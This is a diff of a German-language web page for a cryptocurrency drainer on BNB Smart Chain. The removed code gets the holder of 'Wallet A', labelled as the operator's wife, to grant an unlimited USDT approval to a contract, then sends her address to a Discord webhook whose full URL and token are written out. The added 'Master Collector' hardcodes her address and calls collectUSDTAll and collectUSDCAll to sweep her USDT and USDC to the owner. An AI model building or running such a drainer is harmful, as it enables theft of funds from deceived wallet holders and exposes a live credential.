@@ -3,127 +3,86 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
-  <title>Global Master Panel (Final)</title>
+  <title>Admin Master Collector</title>
   <style>
     body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:15px; }
     .box{ background:#020617; padding:25px; border-radius:16px; width:100%; max-width:400px; border: 1px solid #1e293b; box-shadow:0 10px 30px rgba(0,0,0,.5); }
     h2{ margin-top:0; color: #f8fafc; font-size: 18px; text-align: center; margin-bottom: 20px; }
     .step { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
     .step-title { font-size: 11px; font-weight: bold; text-transform: uppercase; color: #94a3b8; margin-bottom: 10px; display: block; }
-    input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: #10b981; font-family: monospace; font-size: 11px; margin-bottom: 10px; box-sizing: border-box; outline: none; }
+    input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: #10b981; font-family: monospace; font-size: 11px; margin-bottom: 10px; box-sizing: border-box; }
     button { border:none; padding:12px; width:100%; font-size:14px; font-weight:bold; cursor:pointer; border-radius:10px; color: white; transition: 0.2s; margin-bottom: 8px; -webkit-tap-highlight-color: transparent; }
     button:active { transform: scale(0.98); opacity: 0.8; }
-    .btn-green { background: #22c55e; }
-    .btn-red { background: #ef4444; }
-    .btn-blue { background: #3b82f6; }
+    .btn-connect { background: #3b82f6; }
+    .btn-collect { background: #ef4444; }
     #status { margin-top:10px; padding: 12px; border-radius: 8px; background: #0f172a; font-size: 12px; text-align: center; border: 1px dashed #334155; color: #cbd5e1; }
+    .token-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
   </style>
 </head>
 <body>
 
 <div class="box">
-  <h2>Global Master Panel</h2>
+  <h2>Master Collector</h2>
 
   <div class="step">
-    <span class="step-title">Aktion für Wallet A (Frau)</span>
-    <button class="btn-green" onclick="approveAndNotify()">USDT Freigeben & Senden</button>
+    <span class="step-title">1. Quell-Adresse (Wallet A)</span>
+    <input type="text" id="targetAddr" placeholder="0x... (Adresse deiner Frau)" value="0xb023601eccfa6c329813f00a2ef18b8a3ea3ed08">
+    <p style="font-size: 9px; color: #94a3b8;">Stelle sicher, dass diese Adresse oben korrekt ist.</p>
   </div>
 
   <div class="step" style="border-left-color: #ef4444;">
-    <span class="step-title">Aktion für Owner (Du)</span>
-    <input type="text" id="targetAddr" placeholder="0x... Adresse aus Discord einfügen">
-    <button class="btn-blue" style="background:#475569;" onclick="connectAdmin()">Owner verbinden</button>
-    <button class="btn-red" onclick="collectFinal()">JETZT EINZIEHEN</button>
+    <span class="step-title">2. Einzug (Admin-Wallet)</span>
+    <button class="btn-connect" onclick="connectAdmin()">1. Owner-Wallet verbinden</button>
+    <div class="token-grid">
+      <button class="btn-collect" onclick="collectToken('USDT')">Ziehe USDT</button>
+      <button class="btn-collect" onclick="collectToken('USDC')">Ziehe USDC</button>
+    </div>
   </div>
 
-  <div id="status">Bereit. BNB-Netzwerk wird automatisch geprüft.</div>
+  <div id="status">Bereit. Bitte Owner-Wallet verbinden.</div>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.1/ethers.umd.min.js"></script>
+
 <script>
-  // Dein Discord Webhook
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1455376553755021466/bYJ1SSGehHhQN7_j84bWk8WXejIKEiAE6z7S031xXshuzLZl6C8SLiWP-m_UqfqTyNGp"; 
-  
   const CONTRACT_ADDR = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
-  const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
-  const BSC_HEX = "0x38";
+  const TOKENS = {
+    USDT: "0x55d398326f99059fF775485246999027B3197955",
+    USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
+  };
 
-  async function ensureBSC() {
-    if (!window.ethereum) return false;
-    try {
-      await window.ethereum.request({
-        method: 'wallet_switchEthereumChain',
-        params: [{ chainId: BSC_HEX }],
-      });
-      return true;
-    } catch (e) {
-      if (e.code === 4902) {
-        try {
-          await window.ethereum.request({
-            method: 'wallet_addEthereumChain',
-            params: [{
-              chainId: BSC_HEX,
-              chainName: 'BNB Smart Chain',
-              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-              rpcUrls: ['https://bsc-dataseed.binance.org/'],
-              blockExplorerUrls: ['https://bscscan.com/']
-            }]
-          });
-          return true;
-        } catch (addError) { return false; }
-      }
-      return false;
-    }
-  }
-
-  async function approveAndNotify() {
-    try {
-      const ok = await ensureBSC();
-      if(!ok) return setStatus("❌ Bitte BNB Chain in der Wallet bestätigen.");
-
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-      const addr = await signer.getAddress();
-      const contract = new ethers.Contract(USDT_ADDR, ["function approve(address s, uint256 a) public returns (bool)"], signer);
-      
-      setStatus("⌛ Approve läuft... Bitte in Wallet bestätigen.");
-      const tx = await contract.approve(CONTRACT_ADDR, ethers.MaxUint256, { gasLimit: 100000 });
-      await tx.wait();
-      
-      setStatus("⌛ Sende Daten an Discord...");
-      await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          embeds: [{
-            title: "🚀 Freigabe erfolgt!",
-            description: `**Wallet A:** \`${addr}\`\n\nDiese Adresse kopieren und im Admin-Feld einfügen.`,
-            color: 16761095 
-          }]
-        })
-      });
-
-      setStatus("✅ Erfolgreich! Admin wurde informiert.");
-    } catch (e) { setStatus("❌ Fehler: " + e.message); }
-  }
+  function setStatus(m) { document.getElementById("status").innerHTML = m; }
 
   async function connectAdmin() {
     try {
-      await ensureBSC();
+      if (!window.ethereum) return setStatus("❌ Bitte im Trust Wallet Browser öffnen!");
       const provider = new ethers.BrowserProvider(window.ethereum);
       await provider.send("eth_requestAccounts", []);
-      setStatus("✅ Owner verbunden (BNB Chain).");
+      setStatus("✅ Owner verbunden. Jetzt Token ziehen.");
     } catch (e) { setStatus("❌ Verbindung fehlgeschlagen."); }
   }
 
-  async function collectFinal() {
+  async function collectToken(type) {
     const source = document.getElementById("targetAddr").value.trim();
-    if(!source.startsWith("0x")) return setStatus("❌ Keine gültige Adresse eingefügt!");
-    
+    if(!source || !source.startsWith("0x")) return setStatus("❌ Bitte korrekte Quell-Adresse eingeben!");
+
     try {
-      await ensureBSC();
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
-      const contract = new ethers.Contract(CONTRACT_ADDR, ["function collectUSDTAll(address f) external"], signer);
       
-      setStatus("⌛
+      const funcName = type === 'USDT' ? "collectUSDTAll" : "collectUSDCAll";
+      const abi = [`function ${funcName}(address from) external`];
+      const contract = new ethers.Contract(CONTRACT_ADDR, abi, signer);
+      
+      setStatus(`⌛ Ziehe ${type} von ${source.substring(0,6)}...`);
+      const tx = await contract[funcName](source);
+      await tx.wait();
+      setStatus(`🎉 ${type} erfolgreich eingezogen!`);
+    } catch (e) { 
+      console.error(e);
+      setStatus("❌ Fehler: Nur der Owner darf das!"); 
+    }
+  }
+</script>
+</body>
+</html>
